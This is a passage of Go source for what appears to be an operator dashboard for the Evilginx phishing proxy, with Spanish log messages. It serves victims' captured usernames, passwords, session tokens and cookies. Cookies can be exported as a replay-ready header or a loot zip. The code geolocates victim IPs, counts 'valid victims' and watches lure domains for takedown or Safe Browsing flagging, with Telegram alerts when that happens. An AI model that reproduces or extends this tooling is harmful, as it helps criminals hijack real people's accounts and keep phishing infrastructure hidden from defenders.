			u := r.URL.Query().Get("url")
			urlMu.Lock()
			n := urlList[:0]
			for _, s := range urlList {
				if s.URL != u {
					n = append(n, s)
				}
			}
			urlList = n
			saveURLsLocked()
			urlMu.Unlock()
			w.WriteHeader(204)
		default:
			http.Error(w, "method not allowed", 405)
		}
	}
}

// ---- Domain monitoring ----

type domStatus struct {
	URL       string `json:"url"`
	Host      string `json:"host"`
	OK        bool   `json:"ok"`
	Code      int    `json:"code"`
	Err       string `json:"err"`
	Flagged   bool   `json:"flagged"`
	LatencyMs int64  `json:"latency_ms"`
	Checked   string `json:"checked"`
}

var (
	domMu    sync.Mutex
	domState = map[string]domStatus{}
	// Do NOT follow redirects: we want to measure YOUR host, not the real site
	// it may redirect to. A 3xx still means the host is reachable.
	monClient = &http.Client{
		Timeout:       12 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}
)

func domainsSnapshot() []domStatus {
	domMu.Lock()
	defer domMu.Unlock()
	out := make([]domStatus, 0, len(domState))
	for _, v := range domState {
		out = append(out, v)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Host < out[j].Host })
	return out
}

func cleanErr(err error) string {
	s := err.Error()
	if i := strings.LastIndex(s, ": "); i >= 0 && len(s)-i < 60 {
		return s[i+2:]
	}
	return s
}

func statusReason(st domStatus) string {
	if st.Err != "" {
		return st.Err
	}
	return fmt.Sprintf("HTTP %d", st.Code)
}

// deriveTargets = explicit list + (optionally) roots seen in session landing URLs.
func deriveTargets(explicit []string, auto bool, dbPath string) []string {
	set := map[string]bool{}
	add := func(u string) {
		u = strings.TrimSpace(u)
		if u == "" {
			return
		}
		if !strings.HasPrefix(u, "http") {
			u = "https://" + u
		}
		if p, err := url.Parse(u); err == nil && p.Host != "" {
			set[p.Scheme+"://"+p.Host+"/"] = true
		}
	}
	for _, e := range explicit {
		add(e)
	}
	// always include manually saved lure URLs
	urlMu.Lock()
	for _, s := range urlList {
		add(s.URL)
	}
	urlMu.Unlock()
	if auto {
		if s, err := loadSessionsCached(dbPath); err == nil {
			for _, x := range s {
				if x.LandingURL != "" {
					add(x.LandingURL)
				}
			}
		}
	}
	out := make([]string, 0, len(set))
	for u := range set {
		out = append(out, u)
	}
	sort.Strings(out)
	return out
}

func checkDomain(u string) domStatus {
	host := u
	if p, err := url.Parse(u); err == nil {
		host = p.Host
	}
	st := domStatus{URL: u, Host: host, Checked: time.Now().Format("15:04:05")}
	start := time.Now()
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (health-monitor)")
	resp, err := monClient.Do(req)
	st.LatencyMs = time.Since(start).Milliseconds()
	if err != nil {
		st.OK = false
		st.Err = cleanErr(err)
		return st
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, 2048))
	st.Code = resp.StatusCode
	st.OK = resp.StatusCode < 500 // reachable; takedown/suspension shows as conn/DNS error instead
	return st
}

// safeBrowsingFlagged batch-checks URLs against Google Safe Browsing (v4).
func safeBrowsingFlagged(key string, urls []string) map[string]bool {
	res := map[string]bool{}
	if key == "" || len(urls) == 0 {
		return res
	}
	entries := make([]map[string]string, 0, len(urls))
	for _, u := range urls {
		entries = append(entries, map[string]string{"url": u})
	}
	body := map[string]interface{}{
		"client": map[string]string{"clientId": "evilginx-dash", "clientVersion": "1.0"},
		"threatInfo": map[string]interface{}{
			"threatTypes":      []string{"MALWARE", "SOCIAL_ENGINEERING", "UNWANTED_SOFTWARE", "POTENTIALLY_HARMFUL_APPLICATION"},
			"platformTypes":    []string{"ANY_PLATFORM"},
			"threatEntryTypes": []string{"URL"},
			"threatEntries":    entries,
		},
	}
	b, _ := json.Marshal(body)
	resp, err := http.Post("https://safebrowsing.googleapis.com/v4/threatMatches:find?key="+url.QueryEscape(key), "application/json", bytes.NewReader(b))
	if err != nil {
		return res
	}
	defer resp.Body.Close()
	var out struct {
		Matches []struct {
			Threat struct {
				URL string `json:"url"`
			} `json:"threat"`
		} `json:"matches"`
	}
	json.NewDecoder(resp.Body).Decode(&out)
	for _, m := range out.Matches {
		res[m.Threat.URL] = true
	}
	return res
}

func startDomainMonitor(explicit []string, auto bool, dbPath, sbKey string, interval time.Duration) {
	run := func() {
		targets := deriveTargets(explicit, auto, dbPath)
		if len(targets) == 0 {
			return
		}
		flagged := safeBrowsingFlagged(sbKey, targets)
		for _, u := range targets {
			st := checkDomain(u)
			if flagged[u] {
				st.Flagged = true
			}
			domMu.Lock()
			prev, existed := domState[u]
			domState[u] = st
			domMu.Unlock()

			cfg := getSettings()
			if cfg.TGEnabled && cfg.TGToken != "" && cfg.TGChat != "" && existed {
				if prev.OK && !st.OK {
					sendTelegram(cfg.TGToken, cfg.TGChat, fmt.Sprintf("🔴 *Dominio caído*\n`%s`\n%s", u, statusReason(st)))
				} else if !prev.OK && st.OK {
					sendTelegram(cfg.TGToken, cfg.TGChat, fmt.Sprintf("🟢 *Dominio recuperado*\n`%s`", u))
				}
				if !prev.Flagged && st.Flagged {
					sendTelegram(cfg.TGToken, cfg.TGChat, fmt.Sprintf("🚩 *Dominio flaggeado (Safe Browsing)*\n`%s`", u))
				}
			}
		}
	}
	go func() {
		run()
		t := time.NewTicker(interval)
		defer t.Stop()
		for range t.C {
			run()
		}
	}()
}

// ---- HTTP ----

func domainsHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(domainsSnapshot())
	}
}

func dataHandler(dbPath string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessions, err := loadSessionsCached(dbPath)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		d := apiData{Now: time.Now().Format("2006-01-02 15:04:05"), DB: dbPath, SBEnabled: sbEnabled, GeoEnabled: geoEnabled}
		for _, s := range sessions {
			loot := s.inspectLoot()
			plan := s.replayPlan()
			ginfo := geo.lookup(s.RemoteAddr, false)
			if ginfo.CountryCode != "" {
				plan.AcceptLang = suggestAcceptLang(ginfo.CountryCode)
			} else if geoEnabled {
				go geo.lookup(s.RemoteAddr, true)
			}
			row := apiSession{
				Id: s.Id, Phishlet: s.Phishlet, Username: s.Username, Password: s.Password,
				Valid: loot.Valid, Kind: loot.Kind, Token: loot.Token, Persistent: loot.Persistent, Tokens: loot.Tokens,
				Expires: loot.Expires, TTLKind: loot.TTLKind,
				Cookies: s.cookieCount(), RemoteAddr: s.RemoteAddr,
				Create: s.CreateTime, Update: s.UpdateTime, UserAgent: s.UserAgent,
				Landing: s.LandingURL, SessionId: s.SessionId,
				Replay: &plan,
			}
			if ginfo.CountryCode != "" {
				gi := ginfo
				row.Geo = &gi
			}
			d.Sessions = append(d.Sessions, row)
		}
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(d)
	}
}

func cookiesHandler(dbPath string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		id := r.URL.Query().Get("id")
		sessions, err := loadSessionsCached(dbPath)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		for _, s := range sessions {
			if fmt.Sprintf("%d", s.Id) == id {
				cks := s.exportCookies()
				if r.URL.Query().Get("format") == "header" {
					parts := make([]string, 0, len(cks))
					for _, c := range cks {
						parts = append(parts, c.Name+"="+c.Value)
					}
					w.Header().Set("Content-Type", "text/plain; charset=utf-8")
					w.Write([]byte(strings.Join(parts, "; ")))
					return
				}
				w.Header().Set("Content-Type", "application/json; charset=utf-8")
				json.NewEncoder(w).Encode(cks)
				return
			}
		}
		http.Error(w, "session not found", 404)
	}
}

// evilginxRunning scans /proc for a running evilginx process (Linux).
func evilginxRunning() bool {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return false
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		b, err := os.ReadFile("/proc/" + e.Name() + "/comm")
		if err != nil {
			continue
		}
		if strings.HasPrefix(strings.TrimSpace(string(b)), "evilginx") {
			return true
		}
	}
	return false
}

func healthHandler(dbPath string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var size, last int64
		var total, validV int
		if fi, err := os.Stat(dbPath); err == nil {
			size = fi.Size()
		}
		if s, err := loadSessionsCached(dbPath); err == nil {
			total = len(s)
			seen := map[string]bool{}
			for _, x := range s {
				if x.UpdateTime > last {
					last = x.UpdateTime
				}
				if x.hasValidSession() {
					u := strings.ToLower(strings.TrimSpace(x.Username))
					if u != "" && !seen[u] {
						seen[u] = true
						validV++
					}
				}
			}
		}
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"version":       version,
			"evilginx_up":   evilginxRunning(),
			"db_size_bytes": size,
			"last_capture":  last,
			"sessions":      total,
			"valid_victims": validV,
			"tg_enabled":    getSettings().TGEnabled,
			"geo_enabled":   geoEnabled,
		})
	}
}

// sameOrigin blocks cross-site state-changing requests (CSRF). Same-origin
// browser fetches send an Origin matching Host; a malicious page's would not.
func sameOrigin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost || r.Method == http.MethodDelete || r.Method == http.MethodPut {
			if o := r.Header.Get("Origin"); o != "" {
				if u, err := url.Parse(o); err != nil || u.Host != r.Host {
					http.Error(w, "cross-origin bloqueado", 403)
					return
				}
			}
		}
		next(w, r)
	}
}

// secureHeaders hardens every response.
func secureHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "no-referrer")
		w.Header().Set("Cache-Control", "no-store")
		next.ServeHTTP(w, r)
	})
}

func basicAuth(next http.HandlerFunc, user, pass string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if user == "" && pass == "" {
			next(w, r)
			return
		}
		u, p, ok := r.BasicAuth()
		if !ok ||
			subtle.ConstantTimeCompare([]byte(u), []byte(user)) != 1 ||
			subtle.ConstantTimeCompare([]byte(p), []byte(pass)) != 1 {
			w.Header().Set("WWW-Authenticate", `Basic realm="evilginx-dashboard"`)
			http.Error(w, "unauthorized", 401)
			return
		}
		next(w, r)
	}
}

func main() {
	dbPath := flag.String("db", "/root/.evilginx/data.db", "ruta al data.db de Evilginx")
	addr := flag.String("addr", "127.0.0.1:8080", "direccion de escucha (mantener en localhost + tunel SSH)")
	user := flag.String("user", "", "usuario basic auth")
	pass := flag.String("pass", "", "password basic auth")
	tgToken := flag.String("tg-token", os.Getenv("TG_TOKEN"), "token del bot de Telegram (o env TG_TOKEN)")
	tgChat := flag.String("tg-chat", os.Getenv("TG_CHAT"), "chat_id de Telegram (o env TG_CHAT)")
	tgInterval := flag.Duration("tg-interval", 15*time.Second, "cada cuanto revisar nuevas sesiones para alertar")
	mon := flag.String("mon", "", "dominios/URLs a monitorear (coma-separados). Vacio = auto desde los landing URLs")
	monAuto := flag.Bool("mon-auto", true, "derivar dominios a monitorear de los landing URLs de las sesiones")
	monInterval := flag.Duration("mon-interval", 5*time.Minute, "cada cuanto comprobar la salud de los dominios")
	sbKey := flag.String("sb-key", os.Getenv("SB_KEY"), "API key de Google Safe Browsing (o env SB_KEY) para detectar flaggeo")
	urlsFile := flag.String("urls-file", "/root/.evilginx-dashboard-urls.json", "fichero donde persistir las URLs guardadas a mano")
	settingsFile := flag.String("settings-file", "/root/.evilginx-dashboard-settings.json", "fichero donde persistir los ajustes (Telegram, etc.)")
	vstateFile := flag.String("vstate-file", "/root/.evilginx-dashboard-vstate.json", "fichero donde persistir el estado por víctima (usada/notas)")
	geoFile := flag.String("geo-file", "/root/.evilginx-dashboard-geo.json", "cache de GeoIP (país/ASN de las IPs de las víctimas)")
	nogeo := flag.Bool("nogeo", false, "no resolver país/ASN (no se envían IPs de víctimas a ip-api.com)")
	insecure := flag.Bool("insecure", false, "permitir escuchar fuera de localhost sin auth (NO recomendado)")
	flag.Parse()

	urlFile = *urlsFile
	loadURLs()

	vsFile = *vstateFile
	loadVState()

	setFile = *settingsFile
	loadSettings()
	// migración: si no hay token guardado pero se pasó por flag/env, sémbralo
	if setCur.TGToken == "" && *tgToken != "" {
		setMu.Lock()
		setCur.TGToken = *tgToken
		setCur.TGChat = *tgChat
		setCur.TGEnabled = true
		saveSettingsLocked()
		setMu.Unlock()
	}

	if _, err := os.Stat(*dbPath); err != nil {
		log.Fatalf("no se encuentra la base de datos en %s: %v", *dbPath, err)
	}
	nonLocal := !strings.HasPrefix(*addr, "127.0.0.1") && !strings.HasPrefix(*addr, "localhost")
	if nonLocal && *user == "" && !*insecure {
		log.Fatal("me niego a exponer el panel fuera de localhost sin auth: contiene credenciales y sesiones. Usa -user/-pass, o -insecure si de verdad sabes lo que haces.")
	}
	if nonLocal {
		log.Println("AVISO: escuchando fuera de localhost. Asegúrate de tener firewall/VPN delante; lo recomendado es 127.0.0.1 + túnel SSH.")
	}

	geoEnabled = !*nogeo
	geo.on = geoEnabled
	geo.file = *geoFile
	geo.load()
	if geoEnabled {
		log.Println("GeoIP: ip-api.com (IPs de víctimas, cache local). -nogeo para desactivar.")
		if s, err := loadSessionsCached(*dbPath); err == nil {
			go warmGeo(s)
		}
	} else {
		log.Println("GeoIP: desactivado")
	}

	http.HandleFunc("/", basicAuth(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(indexHTML)
	}, *user, *pass))
	http.HandleFunc("/api/data", basicAuth(dataHandler(*dbPath), *user, *pass))
	http.HandleFunc("/cookies", basicAuth(cookiesHandler(*dbPath), *user, *pass))

	http.HandleFunc("/api/health", basicAuth(healthHandler(*dbPath), *user, *pass))
	http.HandleFunc("/api/domains", basicAuth(domainsHandler(), *user, *pass))
	http.HandleFunc("/api/urls", basicAuth(sameOrigin(urlsHandler()), *user, *pass))
	http.HandleFunc("/api/settings", basicAuth(sameOrigin(settingsHandler()), *user, *pass))
	http.HandleFunc("/api/test-telegram", basicAuth(sameOrigin(testTelegramHandler()), *user, *pass))
	http.HandleFunc("/api/vstate", basicAuth(sameOrigin(vstateHandler()), *user, *pass))
	http.HandleFunc("/export/loot.zip", basicAuth(exportLootHandler(*dbPath), *user, *pass))
	http.HandleFunc("/export/sessions.csv", basicAuth(exportCSVHandler(*dbPath), *user, *pass))

	startWatcher(*dbPath, *tgInterval)
	if getSettings().TGEnabled {
		log.Println("alertas Telegram: activadas (configurables en el panel > Ajustes)")
	} else {
		log.Println("alertas Telegram: desactivadas (actívalas en el panel > Ajustes)")
	}

	var explicit []string
	if strings.TrimSpace(*mon) != "" {
		explicit = strings.Split(*mon, ",")
	}
	sbEnabled = *sbKey != ""
	if sbEnabled {
		log.Println("############################################################")
		log.Println("# ⚠  SAFE BROWSING ACTIVADO                                 #")
		log.Println("# Se enviaran tus URLs COMPLETAS a Google (Lookup API),    #")
		log.Println("# atadas a tu API key = tu identidad. Es exposicion de      #")
		log.Println("# infra. Quita -sb-key / SB_KEY si no asumes ese riesgo.    #")
		log.Println("############################################################")
	} else {
		log.Println("Safe Browsing: DESACTIVADO (por defecto). No se consulta ningun tercero con tus URLs.")
	}
	if len(explicit) > 0 || *monAuto {
		startDomainMonitor(explicit, *monAuto, *dbPath, *sbKey, *monInterval)
		log.Printf("monitor de dominios activo (intervalo %s)", *monInterval)
	}

	log.Printf("Evilginx dashboard v%s en http://%s  (db: %s)", version, *addr, *dbPath)
	srv := &http.Server{
		Addr:              *addr,
		Handler:           secureHeaders(http.DefaultServeMux),
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		IdleTimeout:       60 * time.Second,
		// WriteTimeout deliberately unset: loot zip downloads may stream a while.
	}
	log.Fatal(srv.ListenAndServe())
}
